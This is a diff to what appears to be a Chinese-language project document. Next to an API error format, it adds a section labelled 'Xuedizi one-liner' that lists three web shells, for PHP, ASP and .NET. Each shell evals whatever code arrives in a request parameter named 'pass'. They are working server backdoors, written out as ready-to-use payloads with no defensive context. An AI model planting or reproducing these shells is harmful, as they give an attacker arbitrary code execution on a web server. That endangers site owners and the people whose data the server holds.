@@ -122,3 +122,9 @@ www 根目录
 	"type":"error",
 	"info":"错误信息"
 }
+
+
+####血滴子一句话
+PHP: <?php @eval($_POST['pass']);?>
+ASP: <%eval request("pass")%>
+.NET: <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
